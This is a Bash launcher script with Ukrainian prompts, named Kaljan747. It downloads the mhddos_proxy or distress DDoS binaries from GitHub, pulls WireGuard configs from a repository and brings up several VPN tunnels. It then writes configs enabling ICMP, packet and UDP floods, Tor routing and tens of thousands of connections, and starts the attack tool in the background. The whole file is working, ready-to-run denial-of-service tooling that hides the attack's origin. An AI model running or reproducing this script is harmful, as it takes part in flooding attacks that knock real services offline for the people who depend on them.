#!/bin/bash
set -e

print_header() {
    echo -e "\e[1;36m========================================"
    echo -e "🚀  Запуск Kaljan747"
    echo -e "========================================\e[0m"
}

print_stage() {
    echo -e "\e[1;34m$1\e[0m"
}

SETTINGS_FILE="$HOME/.kaljan747_settings"

ask_user_id() {
    read -p "Введіть ваш user-id (тільки цифри): " USER_ID
}

ask_run_parameters() {
    echo "Скільки робочих тунелів потрібно підняти (1-20)?"
    read -p "Кількість WG: " MAX_WG
    [[ "$MAX_WG" =~ ^[0-9]+$ ]] || MAX_WG=4
    [ "$MAX_WG" -lt 1 ] && MAX_WG=1
    [ "$MAX_WG" -gt 20 ] && MAX_WG=20
    echo "Виберіть модуль:"
    echo "1) mhddos_proxy"
    echo "2) distress"
    read -p "Ваш вибір (1/2): " mod_choice
    SELECTED_MODULE=$( [ "$mod_choice" = "1" ] && echo "mhddos_proxy" || echo "distress" )

    echo "Редагувати INI перед запуском?"
    echo "1) Так"
    echo "2) Ні"
    read -p "Ваш вибір (1/2): " edit_choice
    EDIT_INI=$( [ "$edit_choice" = "1" ] && echo "Так" || echo "Ні" )

    echo "Виберіть режим запуску:"
    echo "1) screen у фоні"
    echo "2) screen відкрито"
    echo "3) без screen"
    read -p "Ваш вибір (1/2/3): " run_choice
    case "$run_choice" in
        1) SELECTED_RUN_MODE="screen у фоні";;
        2) SELECTED_RUN_MODE="screen відкрито";;
        3) SELECTED_RUN_MODE="без screen";;
    esac
}

if [ -f "$SETTINGS_FILE" ]; then
    echo "1) Використати старі налаштування"
    echo "2) Ввести нові"
    read -p "Ваш вибір (1/2): " choice
    if [ "$choice" = "1" ]; then
        source "$SETTINGS_FILE"
        : "${MAX_WG:=4}"
    else
        USER_ID=""; SELECTED_MODULE=""; EDIT_INI=""; SELECTED_RUN_MODE=""
    fi
fi

[ -z "$USER_ID" ] && ask_user_id
[ -z "$SELECTED_MODULE" ] || [ -z "$EDIT_INI" ] || [ -z "$SELECTED_RUN_MODE" ] && ask_run_parameters

print_header
echo -e "📅  USER-ID: \e[1;32m$USER_ID\e[0m"
echo -e "🧰  Модуль: \e[1;36m$SELECTED_MODULE\e[0m"
echo -e "🛠️  Режим: \e[1;36m$SELECTED_RUN_MODE\e[0m"

echo "MAX_WG=\"$MAX_WG\"" > "$SETTINGS_FILE"
echo "USER_ID=\"$USER_ID\"" >> "$SETTINGS_FILE"
echo "SELECTED_MODULE=\"$SELECTED_MODULE\"" >> "$SETTINGS_FILE"
echo "EDIT_INI=\"$EDIT_INI\"" >> "$SETTINGS_FILE"
echo "SELECTED_RUN_MODE=\"$SELECTED_RUN_MODE\"" >> "$SETTINGS_FILE"

[ "$(id -u)" -eq 0 ] && SUDO="" || SUDO="sudo"

# === Автоматичне визначення шляху до wg_confs ===
if [ -d "$PWD/wg_confs" ]; then
  WG_DIR="$PWD/wg_confs"
elif [ -d "$HOME/wg_confs" ]; then
  WG_DIR="$HOME/wg_confs"
else
  echo "❌ Не знайдено папку wg_confs. Створюю в \$HOME"
  WG_DIR="$HOME/wg_confs"
  mkdir -p "$WG_DIR"
fi

echo "📂 Поточна папка WG: $WG_DIR"

MODULE_DIR="$HOME/modules"
mkdir -p "$MODULE_DIR"
touch "$MODULE_DIR/mhddos.ini" "$MODULE_DIR/distress.ini"

case "$SELECTED_MODULE" in
    mhddos_proxy)
        MODULE="$MODULE_DIR/mhddos_proxy"
        CONFIG_FILE="$MODULE_DIR/mhddos.ini"
        MODULE_NAME="mhddos"
        DOWNLOAD_LINK="https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux"
        ;;
    distress)
        MODULE="$MODULE_DIR/distress"
        CONFIG_FILE="$MODULE_DIR/distress.ini"
        MODULE_NAME="distress"
        DOWNLOAD_LINK="https://github.com/Yneth/distress-releases/releases/latest/download/distress_x86_64-unknown-linux-musl"
        ;;
esac

[ -f "$MODULE" ] || wget -qO "$MODULE" "$DOWNLOAD_LINK"
chmod +x "$MODULE"

print_stage "🌍  Завантаження WG-конфігів..."

WG_REPO_HTML="https://github.com/k7771/Kaljan747/tree/k7771/wg"
WG_RAW_BASE="https://raw.githubusercontent.com/k7771/Kaljan747/k7771/wg"

CONF_LIST_GITHUB=$(curl -fsSL "$WG_REPO_HTML" | grep -oP '(?<=href=")[^"]+\.conf(?=")' | grep "/k7771/Kaljan747/blob/" | sed -E 's|^/k7771/Kaljan747/blob/k7771/wg/||')

if [ -n "$CONF_LIST_GITHUB" ]; then
    echo "🌐 Завантаження з GitHub:"
    for file in $CONF_LIST_GITHUB; do
        RAW_URL="$WG_RAW_BASE/$file"
        DEST="$WG_DIR/$(basename "$file")"
        if ! curl -fsSL "$RAW_URL" -o "$DEST"; then
            echo "⚠️ curl не спрацював — пробую wget..."
            wget -qO "$DEST" "$RAW_URL" || echo "❌ Не вдалося завантажити $file"
        else
            echo "✅ Завантажено: $file"
        fi
    done
else
    echo "⚠️ Не вдалося отримати список .conf з GitHub — пропускаємо GitHub"
fi

CONF_LIST_LOCAL=$(find "$WG_DIR" -name "*.conf" -type f)

if [ -z "$CONF_LIST_LOCAL" ]; then
    echo "❌ Жодного .conf не знайдено навіть локально. Завершення."
    exit 1
else
    echo "📂 Локальні .conf файли: $(basename -a $CONF_LIST_LOCAL | tr '\n' ' ')"
fi

$SUDO chmod 600 "$WG_DIR"/*.conf 2>/dev/null || true

ACTIVE_IFACES=$(wg show interfaces 2>/dev/null | xargs)

if [ -n "$ACTIVE_IFACES" ]; then
    echo -e "\n🛑 Буде зупинено інтерфейси: $ACTIVE_IFACES"
    for iface in $ACTIVE_IFACES; do
        echo "🧹 Зупинка та очищення інтерфейсу: $iface"
        $SUDO wg-quick down "$WG_DIR/$iface.conf" || true
        $SUDO ip link delete "$iface" || true
    done
else
    echo "✅ Активних інтерфейсів не знайдено."
fi

WG_FILES=($(find "$WG_DIR" -name "*.conf" -type f | shuf))
WG_IFACES=()
SUCCESS=0
FAIL=0

echo -e "\n🔧 Перевірка та підняття WG-інтерфейсів:"

for conf in "${WG_FILES[@]}"; do
    IFACE_NAME=$(basename "$conf" .conf)
    echo -e "\n📄 $IFACE_NAME:"

    if ! grep -q "PrivateKey" "$conf"; then echo "❌ Відсутній PrivateKey"; ((FAIL++)); continue; fi
    if ! grep -q "Endpoint" "$conf"; then echo "❌ Відсутній Endpoint"; ((FAIL++)); continue; fi

    if # запускаємо wg-quick з повним шляхом
        $SUDO wg-quick up "$conf" 2> >(tee /tmp/wg_error.log >&2); then
        if $SUDO wg show "$IFACE_NAME" &>/dev/null; then
            WG_IFACES+=("$IFACE_NAME")
            echo "✅ Інтерфейс $IFACE_NAME піднято"
            $SUDO wg show "$IFACE_NAME"
            ((SUCCESS++))
            [ ${#WG_IFACES[@]} -ge $MAX_WG ] && break
        else
            echo "⚠️ Неактивний $IFACE_NAME"
            ((FAIL++))
        fi
    else
        echo "❌ Помилка $IFACE_NAME:"
        cat /tmp/wg_error.log
        ((FAIL++))
    fi
    sleep 1

done

rm -f /tmp/wg_error.log

echo -e "\n📊 Результат: Успішно: $SUCCESS | Помилок: $FAIL"

[ ${#WG_IFACES[@]} -eq 0 ] && echo "❌ Нічого не піднялось. Вихід." && exit 1

VPN_LIST=$(IFS=' '; echo "${WG_IFACES[*]}")
VPN_LIST_COMMAS=$(IFS=','; echo "${WG_IFACES[*]}")

echo "--use-my-ip 0 --copies 4 -t 12000 --ifaces $VPN_LIST --user-id=$USER_ID" > "$MODULE_DIR/mhddos.ini"
echo "--use-my-ip 0 --enable-icmp-flood --enable-packet-flood --direct-udp-mixed-flood --use-tor 30 --disable-auto-update -c 40000 --interface=$VPN_LIST_COMMAS --user-id=$USER_ID" > "$MODULE_DIR/distress.ini"

[ "$EDIT_INI" = "Так" ] && nano "$CONFIG_FILE"

case "$SELECTED_RUN_MODE" in
    "screen у фоні") screen -dmS "$MODULE_NAME" "$MODULE" $(cat "$CONFIG_FILE") ;;
    "screen відкрито") screen -S "$MODULE_NAME" "$MODULE" $(cat "$CONFIG_FILE") ;;
    "без screen") "$MODULE" $(cat "$CONFIG_FILE") & ;;
esac

exit 0
